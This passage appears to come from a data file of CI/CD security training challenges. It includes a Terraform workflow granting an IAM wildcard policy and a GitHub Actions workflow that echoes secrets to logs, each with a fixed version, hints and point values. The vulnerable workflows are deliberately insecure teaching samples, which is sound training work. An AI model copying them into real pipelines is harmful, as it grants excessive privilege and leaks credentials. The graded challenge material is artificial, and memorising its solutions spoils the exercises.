    "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > iam.tf\n          resource \"aws_iam_policy\" \"app_policy\" {\n            name        = \"app-full-access\"\n            description = \"Full access for application\"\n\n            policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect   = \"Allow\"\n                  Action   = \"*\"\n                  Resource = \"*\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role\" \"app_role\" {\n            name = \"app-role\"\n\n            assume_role_policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Principal = {\n                    Service = \"ec2.amazonaws.com\"\n                  }\n                  Action = \"sts:AssumeRole\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role_policy_attachment\" \"app\" {\n            role       = aws_iam_role.app_role.name\n            policy_arn = aws_iam_policy.app_policy.arn\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > iam.tf\n          resource \"aws_iam_policy\" \"app_policy\" {\n            name        = \"app-limited-access\"\n            description = \"Limited access for application\"\n\n            policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Action = [\n                    \"s3:GetObject\",\n                    \"s3:PutObject\",\n                    \"s3:ListBucket\"\n                  ]\n                  Resource = [\n                    \"arn:aws:s3:::myapp-bucket\",\n                    \"arn:aws:s3:::myapp-bucket/*\"\n                  ]\n                },\n                {\n                  Effect = \"Allow\"\n                  Action = [\n                    \"logs:CreateLogGroup\",\n                    \"logs:CreateLogStream\",\n                    \"logs:PutLogEvents\"\n                  ]\n                  Resource = \"arn:aws:logs:*:*:*\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role\" \"app_role\" {\n            name = \"app-role\"\n\n            assume_role_policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Principal = {\n                    Service = \"ec2.amazonaws.com\"\n                  }\n                  Action = \"sts:AssumeRole\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role_policy_attachment\" \"app\" {\n            role       = aws_iam_role.app_role.name\n            policy_arn = aws_iam_policy.app_policy.arn\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "hints": [
      "# Hint 1: Why wildcards are catastrophic\n\n`\"Action\": \"*\"` means the entity can call ANY AWS API — create users, delete databases, access any bucket. `\"Resource\": \"*\"` means it applies to EVERYTHING. Together, they're equivalent to root access.\n",
      "# Hint 2: The fix\n\nReplace `\"Action\": \"*\"` with specific actions your app needs (e.g., `[\"s3:GetObject\", \"s3:PutObject\"]`). Replace `\"Resource\": \"*\"` with specific ARNs (e.g., `\"arn:aws:s3:::my-bucket/*\"`). Use AWS IAM Access Analyzer to identify unused permissions.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "mon-log-secrets",
    "title": "Secrets in CI Logs",
    "level": "advanced",
    "topic": "monitoring",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow logs sensitive data — tokens, passwords, and secrets — to CI\nlogs that persist in storage. Anyone with log access can extract credentials.\nUse secret masking and filter sensitive output.\n",
    "tags": [
      "monitoring",
      "logs",
      "secrets",
      "masking"
    ],
    "scenario": "# Scenario: Secrets in CI Logs\n\nYour workflow echoes secrets for debugging purposes — `echo ${{ secrets.API_TOKEN }}` to \"verify it's set.\" These logs are stored in GitHub's log storage and are accessible to anyone with Actions read access.\n\nEven after you remove the echo step, the secrets remain in the historical logs. Attackers who gain read access to your repository can extract all secrets that were ever logged.\n\nAdditionally, some steps output sensitive data to stdout/stderr by default (like `npm install` showing auth tokens in verbose mode).\n\n**Your mission:** Remove all secret logging and add `::add-mask::` to mask any sensitive values that must appear in logs.\n\n## Key concepts\n- `::add-mask::VALUE` redacts a value from all subsequent log output\n- Secrets logged once are exposed forever — there's no \"unlog\"\n- Even `echo ${{ secrets.X }}` before the mask leaks the value\n",
    "vulnerableWorkflow": "name: Deploy with Secrets\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Verify credentials\n        run: |\n          echo \"API Token: ${{ secrets.API_TOKEN }}\"\n          echo \"AWS Key: ${{ secrets.AWS_ACCESS_KEY_ID }}\"\n          echo \"DB Password: ${{ secrets.DB_PASSWORD }}\"\n\n      - name: Setup credentials\n        run: |\n          echo \"Setting up AWS credentials...\"\n          export AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}\n          export AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}\n\n      - name: Deploy\n        run: |\n          echo \"Deploying with token ${{ secrets.API_TOKEN }}...\"\n          echo \"Deploy complete\"\n",
    "solutionWorkflow": "name: Deploy with Secrets\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Mask secrets\n        run: |\n          echo \"::add-mask::${{ secrets.AWS_ACCESS_KEY_ID }}\"\n          echo \"::add-mask::${{ secrets.AWS_SECRET_ACCESS_KEY }}\"\n\n      - name: Setup credentials\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          echo \"AWS credentials configured via environment\"\n\n      - name: Deploy\n        env:\n          API_TOKEN: ${{ secrets.API_TOKEN }}\n        run: |\n          echo \"Deploying...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: How secrets leak in logs\n\n`echo ${{ secrets.X }}` directly prints the secret value. Even if you remove it later, the log entry persists. GitHub Actions logs are stored indefinitely and accessible to anyone with repository read access.\n",
      "# Hint 2: The fix\n\nRemove all `echo ${{ secrets.* }}` steps. If you must reference a secret, use `::add-mask::${{ secrets.X }}` FIRST to register it as a mask, then use it. The mask ensures the value is replaced with `***` in all subsequent output.\n"
    ],
    "hintsPenalty": 50
  }
];
